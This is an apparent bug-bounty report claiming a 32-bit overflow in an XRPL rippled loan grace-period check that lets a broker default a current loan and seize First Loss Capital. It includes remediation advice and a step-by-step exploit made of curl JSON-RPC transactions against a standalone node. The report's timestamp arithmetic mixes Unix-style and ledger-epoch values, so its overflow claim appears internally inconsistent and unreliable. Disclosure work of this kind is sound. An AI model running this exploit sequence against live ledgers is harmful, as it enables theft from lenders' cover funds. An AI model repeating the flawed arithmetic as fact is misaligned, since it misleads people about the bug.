# Title
Grace-window overflow in LoanManage enables immediate First Loss Capital drain

**Severity:** Critical

# Description

## Brief/Intro
`LoanManage::preclaim` decides whether a broker may call `tfLoanDefault` by ensuring the parent close time has passed `sfNextPaymentDueDate + sfGracePeriod`. Both fields are 32-bit ledger timestamps. When a broker configures large—but still admissible—values during `LoanSet`, that sum overflows, appears decades in the past, and `hasExpired` returns true. The broker can default the loan while the borrower is fully current, confiscating First Loss Capital (FLC).

## Vulnerability Details
- `LoanSet::preclaim` only requires `startDate + paymentInterval * paymentTotal ≤ 2^32 - 1` (`src/xrpld/app/tx/detail/LoanSet.cpp:208-234`). Values such as `paymentInterval = 1_000_000_000`, `paymentTotal = 2`, and `gracePeriod = 1_000_000_000` satisfy every guard, so the protocol admits these large intervals.
- During default evaluation, `LoanManage::preclaim` executes:
  ```cpp
  if (tx.isFlag(tfLoanDefault) &&
      !hasExpired(
          ctx.view,
          loanSle->at(sfNextPaymentDueDate) + loanSle->at(sfGracePeriod)))
      return tecTOO_SOON;
  ```
  (`src/xrpld/app/tx/detail/LoanManage.cpp:108-115`). The addition is performed with 32-bit arithmetic; whenever the sum exceeds `2^32 - 1`, it wraps instead of failing admission.
- `hasExpired` compares the parent close time with the wrapped timestamp (`src/libxrpl/ledger/View.cpp:172-179`). At loan origination the first due date sits around `startDate + paymentInterval ≈ 2 738 000 000`. After the borrower makes the scheduled payment, `LoanPay` advances it to `≈ 3 738 000 000` (still < `2^32`). Adding the 1 000 000 000-second grace period yields `4 738 000 000`, which exceeds the 32-bit range and wraps to `443 032 704` (~2014). Because the parent close time (~2025) already exceeds that wrapped value, `hasExpired` reports that the grace window elapsed and the broker may default immediately.
- Once admitted, `LoanManage::defaultLoan` reduces `sfCoverAvailable` and transfers the default-covered amount out of the broker pseudo-account (`LoanManage.cpp:261-302`). The borrower never missed a payment, yet First Loss Capital is seized.
- The earlier suspicion that `LoanPay` overflows was disproven; `LoanSet::preclaim` keeps the per-payment increment within range. The defect lives solely in the grace-period addition.

## Impact Details
- Satisfies Immunefi **Critical** impacts: “Drainage and/or stealing of funds from ledger objects (vault, first loss capital)” and “Direct loss of funds”.
- Grace-period protections collapse: brokers can default healthy loans and confiscate cover instantly, exposing lenders to uncompensated losses.
- Undermines protocol invariants that require defaults to occur only after the configured grace window, threatening production deployments.

## References
- `src/xrpld/app/tx/detail/LoanManage.cpp`
- `src/xrpld/app/tx/detail/LoanSet.cpp`
- `src/libxrpl/ledger/View.cpp`

# Proof of Concept

The steps below follow Immunefi’s Option B guidance (standalone node, real transactions). Replace placeholders (`<...>`) with values from your environment.

1. **Start a standalone lending-enabled rippled node.**
   ```sh
   ./rippled -a --start --conf standalone.cfg
   ```

2. **Generate deterministic wallets for issuer (I), broker owner (B), and borrower (U).**
   ```sh
   for name in "issuer grace demo" "broker grace demo" "borrower grace demo"; do
     curl -s http://127.0.0.1:5005 -d '{"method":"wallet_propose","params":[{"passphrase":"'$name'"}]}' |
       jq '.result | {account_id, master_seed}';
   done
   ```

3. **Fund each account from the genesis master to cover fees.**
   ```sh
   for acct in <ISSUER_ACCOUNT> <BROKER_ACCOUNT> <BORROWER_ACCOUNT>; do
     curl -s http://127.0.0.1:5005 -d '{
       "method":"submit",
       "params":[{
         "secret":"snoPBrXtMeMyMHUVTgbuqAfg1SUTb",
         "tx_json":{
           "TransactionType":"Payment",
           "Account":"rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh",
           "Destination":"'$acct'",
           "Amount":"1000000000"
         }
       }]
     }' | jq '.result.engine_result';
   done
   ```

4. **Establish IOU trust lines and seed the broker with issuer IOUs.**
   ```sh
   # Broker trust line to issuer IOU (authorizes IOU balances for cover)
   curl -s http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"TrustSet",
         "Account":"<BROKER_ACCOUNT>",
         "LimitAmount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"1000000000000"
         },
         "Flags":262144
       }
     }]
   }' | jq '.result.engine_result'

   # Borrower trust line to issuer IOU (needed for LoanSet and repayments)
   curl -s http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BORROWER_SECRET>",
       "tx_json":{
         "TransactionType":"TrustSet",
         "Account":"<BORROWER_ACCOUNT>",
         "LimitAmount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"1000000000000"
         }
       }
     }]
   }' | jq '.result.engine_result'

   # Fund the broker with issuer IOUs (becomes First Loss Capital)
   curl -s http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<ISSUER_SECRET>",
       "tx_json":{
         "TransactionType":"Payment",
         "Account":"<ISSUER_ACCOUNT>",
         "Destination":"<BROKER_ACCOUNT>",
         "Amount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"5000000"
         },
         "Flags":131072
       }
     }]
   }' | jq '.result.engine_result'
   ```

5. **Create a vault, establish the loan broker, and deposit cover. Capture IDs for later use.**
   ```sh
   # VaultCreate
   VAULT_HASH=$(curl -s http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"VaultCreate",
         "Account":"<BROKER_ACCOUNT>",
         "Asset":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>"
         },
         "Scale":6
       }
     }]
   }' | jq -r '.result.tx_json.hash')

   VAULT_ID=$(curl -s http://127.0.0.1:5005 -d '{"method":"tx","params":[{"transaction":"'$VAULT_HASH'"}]}' |
     jq -r '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="Vault").CreatedNode.LedgerIndex')

   # LoanBrokerSet
   BROKER_HASH=$(curl -s http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"LoanBrokerSet",
         "Account":"<BROKER_ACCOUNT>",
         "VaultID":"'$VAULT_ID'",
         "CoverRateMinimum":1
       }
     }]
   }' | jq -r '.result.tx_json.hash')

   BROKER_ID=$(curl -s http://127.0.0.1:5005 -d '{"method":"tx","params":[{"transaction":"'$BROKER_HASH'"}]}' |
     jq -r '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="LoanBroker").CreatedNode.LedgerIndex')

   # Deposit First Loss Capital (cover)
   curl -s http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"LoanBrokerCoverDeposit",
         "Account":"<BROKER_ACCOUNT>",
         "LoanBrokerID":"'$BROKER_ID'",
         "Amount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"1000000"
         }
       }
     }]
   }' | jq '.result.engine_result'
   ```

6. **Originate a loan whose schedule will overflow when the grace period is added.**
   ```sh
   LOAN_HASH=$(curl -s http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"LoanSet",
         "Account":"<BROKER_ACCOUNT>",
         "LoanBrokerID":"'$BROKER_ID'",
         "Counterparty":"<BORROWER_ACCOUNT>",
         "PrincipalRequested":{"currency":"USD","issuer":"<ISSUER_ACCOUNT>","value":"1000"},
         "InterestRate":500,
         "PaymentInterval":1000000000,
         "PaymentTotal":2,
         "GracePeriod":1000000000
       }
     }]
   }' | jq -r '.result.tx_json.hash')

   LOAN_ID=$(curl -s http://127.0.0.1:5005 -d '{"method":"tx","params":[{"transaction":"'$LOAN_HASH'"}]}' |
     jq -r '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="Loan").CreatedNode.LedgerIndex')
   ```

7. **Pay the first installment on time.**
   ```sh
   curl -s http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BORROWER_SECRET>",
       "tx_json":{
         "TransactionType":"LoanPay",
         "Account":"<BORROWER_ACCOUNT>",
         "LoanID":"'$LOAN_ID'",
         "Amount":{"currency":"USD","issuer":"<ISSUER_ACCOUNT>","value":"600"}
       }
     }]
   }' | jq '.result.engine_result'

   curl -s http://127.0.0.1:5005 -d '{"method":"ledger_entry","params":[{"index":"'$LOAN_ID'"}]}' |
     jq '.result.node.NextPaymentDueDate'
   ```
   The new due date is ≈ 3 738 000 000 (still below `2^32`).

8. **Exploit: default immediately despite the borrower being current.**
   ```sh
   curl -s http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"LoanManage",
         "Account":"<BROKER_ACCOUNT>",
         "LoanID":"'$LOAN_ID'",
         "Flags":1
       }
     }]
   }' | jq '.result.engine_result'

   curl -s http://127.0.0.1:5005 -d '{"method":"ledger_entry","params":[{"index":"'$LOAN_ID'"}]}' |
     jq '.result.node.Flags'

   curl -s http://127.0.0.1:5005 -d '{"method":"ledger_entry","params":[{"index":"'$BROKER_ID'"}]}' |
     jq '.result.node.CoverAvailable'
   ```
   Outcome: the transaction returns `tesSUCCESS`, the loan now carries the default flag, and `CoverAvailable` decreases immediately, confirming the FLC drain without any missed payment.

# Impact
- Enables brokers to weaponize large grace periods to short-circuit repayment schedules and liquidate honest borrowers.

# Recommended Remediation
- Reject `tfLoanDefault` when `sfNextPaymentDueDate > maxTime - sfGracePeriod`, or promote the addition to a wider integer before calling `hasExpired`.
- Add regression coverage for large `PaymentInterval`/`GracePeriod` combinations to prevent regressions.
